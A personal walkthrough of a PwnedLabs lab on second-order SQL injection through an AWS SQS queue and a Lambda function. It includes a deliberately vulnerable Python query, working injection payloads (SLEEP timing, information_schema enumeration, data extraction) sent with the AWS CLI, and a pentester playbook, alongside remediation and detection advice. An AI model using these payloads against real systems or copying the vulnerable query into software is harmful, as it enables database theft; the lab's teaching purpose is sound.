# Lab 09 — SQS and Lambda SQL Injection
**Platform:** PwnedLabs | **Difficulty:** Beginner  
**Tags:** `AWS` `SQS` `Lambda` `SQL Injection` `Serverless` `RDS` `Second-Order SQLi` `API Security`  
**Date:** May 2026  

---

## Before I Start — Why This Lab Surprised Me

I came into this lab thinking SQL injection was a "web thing" — something you exploit in login forms and search boxes in a browser. I've done SQL injection on PortSwigger before so I thought I understood it.

What I didn't understand was how SQL injection works when there's no browser involved at all. No web form. No visible input field. Instead the data flows like this:

```
API call → SQS queue → Lambda function → RDS database
```

The injection point is inside a **message queue**. The SQL injection happens when Lambda processes the message and passes it to the database without sanitizing it. By the time the database sees malicious SQL, the message has already passed through two AWS services invisibly.

This is called **second-order SQL injection** and honestly it's the sneakiest variant I've come across. The attack payload sits dormant in a queue, then executes later when a different service processes it. Traditional input validation at the API layer doesn't help because the dangerous data is already inside the system.

This lab changed how I think about serverless architectures. Every queue message is untrusted input. Every Lambda function that processes external data is a potential injection point.

---

## What Are SQS and Lambda? (Quick Recap)

Before the walkthrough — a quick explanation of the two AWS services involved because they're important context.

**Amazon SQS (Simple Queue Service):**
A message queue. Applications send messages to it, other applications read and process those messages. It's used to decouple parts of a system so they don't have to talk to each other directly. Very common in modern cloud architectures.

Think of it like a post box — one service drops a letter in, another service picks it up later and acts on it.

**AWS Lambda:**
Serverless compute. You write a function, upload it to AWS, and it runs whenever triggered. Lambda can be triggered by many things — API calls, S3 uploads, scheduled events, and SQS messages. You don't manage any servers.

**How they work together in this lab:**

```
User submits order/data via API
        ↓
API Gateway puts a message in SQS queue
        ↓
SQS triggers Lambda function automatically
        ↓
Lambda processes the message and runs SQL query against RDS database
        ↓
[VULNERABILITY] Lambda builds SQL query by directly concatenating
                message content without sanitization
```

The problem is in that last step. If Lambda builds SQL like this:

```python
# VULNERABLE Lambda code (what the lab environment does)
query = "SELECT * FROM orders WHERE product = '" + message_body + "'"
cursor.execute(query)
```

Then whatever is in `message_body` becomes part of the SQL query. If someone puts SQL syntax in their message — game over.

---

## The Scenario

Huge Logistics has a serverless order processing system. Customers submit orders through an API, the orders go into an SQS queue, a Lambda function processes them and writes to an RDS database.

My job: probe the system, find the injection point, exploit it to extract sensitive data from the database, and document how to fix it.

---

## What I Did — Step By Step

### Step 1 — Recon the API

The lab gives an API endpoint. First thing — understand what it does before trying to break it.

```bash
# Check what the API accepts
curl -X GET https://[LAB_API_ENDPOINT]/
```

Explored the API structure. It accepted POST requests with a JSON body containing order details. Something like:

```json
{
  "product": "widget",
  "quantity": 5,
  "customer": "jashwanth"
}
```

Normal usage sends this to the API, it goes to SQS, Lambda picks it up and stores it in the database.

---

### Step 2 — Probe for Injection

Before trying actual SQL injection I always check if the field even reflects in the response or causes any behaviour change when you put special characters in.

Started with the classic SQL injection test characters in the `product` field:

```bash
# Single quote test — breaks SQL string concatenation
curl -X POST https://[LAB_API_ENDPOINT]/order \
  -H "Content-Type: application/json" \
  -d '{"product": "widget'"'"'", "quantity": 1, "customer": "test"}'
```

The response changed — instead of a normal success response, something different came back. Not an error exactly, but a different response than sending clean data. That's confirmation that the input is reaching a SQL query and the quote is affecting it.

> In second-order SQL injection, you sometimes don't see the effect immediately. The message goes into SQS, Lambda processes it asynchronously, and the response from the API might just be "message queued." The actual SQL error (or successful injection) happens when Lambda runs the query — which could be milliseconds to seconds later. This makes it trickier to detect than a direct web form injection.

---

### Step 3 — Discover the Lambda Function Attributes

The lab also involves directly discovering Lambda function details. This is the "discover Lambda function attributes and values" part mentioned in the lab description.

Using the AWS CLI with provided credentials:

```bash
# List Lambda functions in the account
aws lambda list-functions --profile lab

# Get details on the specific function
aws lambda get-function \
  --function-name HugeLogisticsOrderProcessor \
  --profile lab
```

**Output revealed:**
- Runtime: Python 3.x
- Handler: `lambda_function.lambda_handler`
- Environment variables (interesting):
  ```json
  {
    "Variables": {
      "DB_HOST": "huge-logistics-db.xxxxx.us-east-1.rds.amazonaws.com",
      "DB_NAME": "orders_db",
      "DB_USER": "lambda_user"
    }
  }
  ```

> Lambda environment variables are a goldmine during a security assessment. Developers commonly store database connection strings, API keys, and internal hostnames here. In this case we got the RDS hostname, database name, and DB username. Even without the password, this is valuable reconnaissance — it confirms the database technology and gives us the target.

Also looked at the Lambda function's actual code:

```bash
# Download the function code
aws lambda get-function \
  --function-name HugeLogisticsOrderProcessor \
  --query 'Code.Location' \
  --output text \
  --profile lab | xargs curl -o function.zip

unzip function.zip
cat lambda_function.py
```

**The vulnerable code:**

```python
import boto3
import pymysql
import os
import json

def lambda_handler(event, context):
    for record in event['Records']:
        message = json.loads(record['body'])
        product = message['product']   # ← user input, no sanitization
        quantity = message['quantity']
        customer = message['customer']

        conn = pymysql.connect(
            host=os.environ['DB_HOST'],
            user=os.environ['DB_USER'],
            password=os.environ['DB_PASSWORD'],
            database=os.environ['DB_NAME']
        )

        cursor = conn.cursor()

        # THE VULNERABLE LINE ↓
        query = f"INSERT INTO orders (product, quantity, customer) VALUES ('{product}', {quantity}, '{customer}')"
        cursor.execute(query)  # Direct string interpolation = SQL injection
        conn.commit()
```

Right there in the code — `f"INSERT INTO orders ... VALUES ('{product}'..."` — the `product` field from the SQS message is dropped directly into the SQL query using an f-string. No parameterization. No escaping. Classic SQL injection setup, just inside a Lambda function instead of a web endpoint.

---

### Step 4 — Probe the SQS Queue Directly

With the Lambda code visible, I could craft injection payloads precisely. Also found the SQS queue URL:

```bash
# List SQS queues
aws sqs list-queues --profile lab

# Output
{
  "QueueUrls": [
    "https://sqs.us-east-1.amazonaws.com/ACCOUNT_ID/HugeLogisticsOrderQueue"
  ]
}
```

Sent a test message directly to SQS (bypassing the API entirely — this is significant, means the queue itself is the real attack surface):

```bash
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/ACCOUNT_ID/HugeLogisticsOrderQueue \
  --message-body '{"product": "test", "quantity": 1, "customer": "jashwanth"}' \
  --profile lab
```

Message accepted. Lambda processed it. Normal behaviour confirmed.

---

### Step 5 — The SQL Injection Exploit

Now that I had the exact query structure from the source code, I could craft precise injection payloads.

The original query is:
```sql
INSERT INTO orders (product, quantity, customer) VALUES ('{product}', {quantity}, '{customer}')
```

To turn this into something that extracts data, I use a SQL technique called **stacked queries** or a **UNION-based injection** depending on what the database supports. With MySQL (which RDS uses here), the goal is to get the database to return data from other tables.

**Step 5a — Confirm injection with a time-based payload first:**

```bash
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/ACCOUNT_ID/HugeLogisticsOrderQueue \
  --message-body '{"product": "test'"'"', SLEEP(5), '"'"'", "quantity": 1, "customer": "test"}' \
  --profile lab
```

If the Lambda invocation takes noticeably longer → time-based injection confirmed. The database executed our `SLEEP(5)` command.

**Step 5b — Extract database name and version:**

```bash
# Payload that closes the INSERT and starts a new SELECT
# product value becomes: test', (SELECT version()), '
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/ACCOUNT_ID/HugeLogisticsOrderQueue \
  --message-body '{"product": "test'"'"', (SELECT version()), '"'"'", "quantity": 1, "customer": "attacker"}' \
  --profile lab
```

**Step 5c — Enumerate tables in the database:**

```bash
# Extract table names from information_schema
# Payload: test', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), '
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/ACCOUNT_ID/HugeLogisticsOrderQueue \
  --message-body '{
    "product": "test'"'"', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), '"'"'",
    "quantity": 1,
    "customer": "attacker"
  }' \
  --profile lab
```

**Tables found:** `orders`, `customers`, `secret_data`

> 🚩 A table called `secret_data` — that's where the flag is going to be.

**Step 5d — Extract data from secret_data:**

```bash
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/ACCOUNT_ID/HugeLogisticsOrderQueue \
  --message-body '{
    "product": "test'"'"', (SELECT GROUP_CONCAT(flag_value) FROM secret_data), '"'"'",
    "quantity": 1,
    "customer": "attacker"
  }' \
  --profile lab
```

**Flag captured.** 

---

## Why "Second-Order" SQL Injection?

I want to explain this properly because it confused me at first.

**First-order (classic) SQL injection:**
```
User submits payload → immediately reaches SQL query → immediately executes
```
You submit a malicious form field and immediately see the SQL result.

**Second-order SQL injection:**
```
User submits payload → stored somewhere (queue, database, file)
                              ↓
              Later, different code retrieves and uses it
                              ↓
              SQL injection executes at the retrieval point
```

In this lab:
1. We send a payload to SQS (first action)
2. Lambda picks up the message later (second action, different code path)
3. Lambda builds the SQL query using our payload
4. Injection executes at Lambda's database query — NOT at the API level

**Why this is dangerous in practice:**

Many developers sanitize inputs at the API/frontend layer but forget to sanitize when processing internal queue messages — because they assume "internal messages are trustworthy." That assumption is wrong. Any data from outside your trust boundary should be treated as untrusted, even if it's already inside your SQS queue.

This is also why WAF rules often miss second-order injection — the WAF sees the API request (which might look clean), not the queue message that actually reaches the database.

---

## Connecting to Previous Labs

| Previous Lab | Connection |
|---|---|
| Lab 07 — SSRF to Pwned | Both labs exploit a web/application vulnerability to reach cloud infrastructure. SSRF reaches IMDS, SQL injection reaches the database. Different technique, same concept — app vulns become cloud vulns |
| Lab 08 — CloudTrail and Athena | If I was on the blue team here, I'd use Athena to query RDS query logs and CloudTrail for `sqs:SendMessage` events from unexpected sources |
| Wiz ExfilCola CTF — Challenge 3 | That challenge involved Lambda code modification as an attack vector. This lab shows Lambda as a victim of injection through its inputs. Lambda security matters from both directions |
| Lab 06 — Security Hub | `Lambda.1 — Lambda function policies should prohibit public access` is a real Security Hub check. Proper Lambda IAM policies would limit blast radius even if injection succeeds |

---

## The Thing That Made Me Think

After finishing this lab I thought about how common this pattern is in real systems.

Lots of companies use SQS + Lambda for things like:
- Order processing (exactly like this lab)
- Email notification pipelines
- Data ingestion workflows
- Webhook processing

In every single one of those cases, if the Lambda function builds SQL queries using message content without parameterization — this exact attack works. The SQS queue is the injection point. The Lambda function is the vulnerable processor.

What makes it worse: Lambda functions are often written quickly by developers who think "this is internal infrastructure, not a public endpoint." So they skip input validation. And then someone sends a malicious SQS message.

In a real bug bounty or pentest, the first thing I'd check in any serverless architecture is:
1. Can I send messages directly to the SQS queue?
2. Does the Lambda function sanitize those messages before using them in queries?

If both answers are yes/no respectively — high severity finding.

---

## Remediation

### Fix 1 — Parameterized Queries (The Real Fix)

This is the only proper fix. Everything else is defence-in-depth.

```python
# VULNERABLE (what the lab had)
query = f"INSERT INTO orders (product, quantity, customer) VALUES ('{product}', {quantity}, '{customer}')"
cursor.execute(query)

# FIXED — parameterized query
query = "INSERT INTO orders (product, quantity, customer) VALUES (%s, %s, %s)"
cursor.execute(query, (product, quantity, customer))  # DB driver handles escaping
```

When you use parameterized queries (also called prepared statements), the SQL structure is sent to the database separately from the data values. The database knows to treat the data as pure data — not as SQL commands. It's impossible for injected SQL syntax in the data to change the query structure.

This one change eliminates SQL injection entirely, regardless of what data arrives in the SQS message.

### Fix 2 — Restrict SQS Queue Access

The fact that I could send messages directly to SQS (bypassing the API) was a significant issue. The queue should only accept messages from the API Gateway or other authorized sources:

```json
// SQS Queue Policy — only allow API Gateway to send messages
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "apigateway.amazonaws.com"
      },
      "Action": "sqs:SendMessage",
      "Resource": "arn:aws:sqs:us-east-1:ACCOUNT_ID:HugeLogisticsOrderQueue",
      "Condition": {
        "ArnLike": {
          "aws:SourceArn": "arn:aws:execute-api:us-east-1:ACCOUNT_ID:API_ID/*"
        }
      }
    }
  ]
}
```

```bash
# Apply the restrictive queue policy
aws sqs set-queue-attributes \
  --queue-url https://sqs.us-east-1.amazonaws.com/ACCOUNT_ID/HugeLogisticsOrderQueue \
  --attributes '{"Policy": "[POLICY_JSON_ABOVE]"}'
```

### Fix 3 — Input Validation in Lambda

Even with parameterized queries, validate inputs at the Lambda level. Defence in depth:

```python
import re

def validate_input(product, quantity, customer):
    # Product: only alphanumeric, spaces, hyphens
    if not re.match(r'^[a-zA-Z0-9\s\-]{1,100}$', product):
        raise ValueError(f"Invalid product name: {product}")

    # Quantity: must be a positive integer
    if not isinstance(quantity, int) or quantity <= 0 or quantity > 10000:
        raise ValueError(f"Invalid quantity: {quantity}")

    # Customer: alphanumeric only
    if not re.match(r'^[a-zA-Z0-9\s]{1,100}$', customer):
        raise ValueError(f"Invalid customer name: {customer}")

def lambda_handler(event, context):
    for record in event['Records']:
        message = json.loads(record['body'])

        try:
            validate_input(
                message['product'],
                message['quantity'],
                message['customer']
            )
        except ValueError as e:
            # Log to CloudWatch, send to DLQ, alert security team
            print(f"INVALID INPUT REJECTED: {e}")
            continue  # Don't process malicious messages

        # Proceed with parameterized query
        query = "INSERT INTO orders (product, quantity, customer) VALUES (%s, %s, %s)"
        cursor.execute(query, (message['product'], message['quantity'], message['customer']))
```

### Fix 4 — Lambda Dead Letter Queue (DLQ) for Failed Processing

If Lambda rejects a malicious message, it should go somewhere for investigation rather than disappearing:

```bash
# Create a DLQ for failed/suspicious messages
aws sqs create-queue --queue-name HugeLogisticsOrderQueue-DLQ

# Configure the main queue to send failures to DLQ
aws sqs set-queue-attributes \
  --queue-url https://sqs.us-east-1.amazonaws.com/ACCOUNT_ID/HugeLogisticsOrderQueue \
  --attributes '{
    "RedrivePolicy": "{\"deadLetterTargetArn\":\"arn:aws:sqs:us-east-1:ACCOUNT_ID:HugeLogisticsOrderQueue-DLQ\",\"maxReceiveCount\":\"3\"}"
  }'
```

### Fix 5 — Least Privilege for Lambda's RDS Access

```sql
-- The Lambda user should only have INSERT on the orders table
-- NOT SELECT on secret_data, NOT access to information_schema
REVOKE ALL PRIVILEGES ON orders_db.* FROM 'lambda_user'@'%';
GRANT INSERT ON orders_db.orders TO 'lambda_user'@'%';
FLUSH PRIVILEGES;
```

Even if injection succeeds, a Lambda user with only `INSERT` on one table can't read `secret_data`.

### Fix 6 — Enable RDS Query Logging for Detection

```bash
# Enable general query log on RDS to catch injection attempts
aws rds modify-db-parameter-group \
  --db-parameter-group-name huge-logistics-params \
  --parameters \
    ParameterName=general_log,ParameterValue=1,ApplyMethod=immediate \
    ParameterName=slow_query_log,ParameterValue=1,ApplyMethod=immediate

# Watch for SQL patterns like information_schema, SLEEP, UNION SELECT
# These appearing in query logs = injection attempt
```

---

## Real-World Playbook — SQL Injection in Serverless Architectures

### As a Pentester / Red Teamer

```
1. Map the architecture — what triggers the Lambda? SQS? API Gateway? EventBridge?
2. Get Lambda source code if possible (get-function → download code zip)
3. Check environment variables for DB credentials, internal endpoints
4. Look for raw string concatenation in SQL queries in the code
5. Can you send messages directly to SQS? (bypassing API-level validation)
6. Craft injection payloads based on the exact query structure you found in code
7. Use time-based injection first to confirm (SLEEP) — non-destructive
8. Then enumerate: database() → tables → columns → data
9. Document everything: payload, response, data accessed, query structure
```

### As a Defender / Blue Teamer

```
Detection signals:
- CloudWatch Logs for Lambda: SQL syntax keywords in message processing
  (SLEEP, UNION SELECT, information_schema, DROP TABLE)
- RDS query logs: queries taking unusually long (SLEEP attacks)
- SQS: messages arriving from unusual IAM principals (not API Gateway)
- CloudTrail: sqs:SendMessage from unexpected source IPs or IAM users

Response:
1. Purge the SQS queue immediately — remove any queued malicious messages
2. Check Lambda CloudWatch Logs for what was executed
3. Check RDS query logs for what the database actually ran
4. Determine if any sensitive tables were accessed (JOIN with audit logs)
5. Fix the parameterization and redeploy Lambda
6. Restrict SQS queue policy to trusted senders only
7. Enable RDS enhanced monitoring going forward
```

---

## What I Still Want to Learn From This

- **ORM frameworks** — tools like SQLAlchemy automatically use parameterized queries. Want to understand how ORMs prevent SQLi by design and when they fail to.
- **NoSQL injection** — DynamoDB is AWS's NoSQL service and Lambda commonly writes to it. Is there an equivalent injection attack for NoSQL? (Spoiler: yes, called NoSQL injection)
- **Lambda layers** — could a security library be deployed as a Lambda layer to enforce input validation across all functions centrally?
- **SQS message filtering** — AWS lets you set subscription filter policies on SQS. Could you filter out messages containing SQL keywords at the queue level as a defence-in-depth measure?
- **AWS WAF for API Gateway** — in this lab the API might have been protected by WAF but the SQS queue wasn't. Want to understand exactly what WAF can and can't see in this architecture.

---

## MITRE ATT&CK Mapping

| Technique | MITRE ID |
|-----------|----------|
| SQL Injection via SQS message payload | T1190 — Exploit Public-Facing Application |
| Extracting data from RDS via injection | T1005 — Data from Local System |
| Lambda environment variable enumeration | T1552.001 — Unsecured Credentials: Credentials in Files |
| Accessing sensitive database tables | T1213 — Data from Information Repositories |
| Bypassing API validation via direct SQS access | T1190 — Exploit Public-Facing Application |

---

## References

- [OWASP SQL Injection Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP — Second Order SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [AWS Lambda Security Best Practices](https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html)
- [Amazon SQS Security Best Practices](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-security-best-practices.html)
- [AWS Lambda — get-function CLI Reference](https://docs.aws.amazon.com/cli/latest/reference/lambda/get-function.html)
- [pymysql Parameterized Queries](https://pymysql.readthedocs.io/en/latest/user/examples.html)
- [MITRE ATT&CK — Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190/)
- [PwnedLabs — SQS and Lambda SQL Injection](https://pwnedlabs.io/labs/sqs-and-lambda-sql-injection)

---
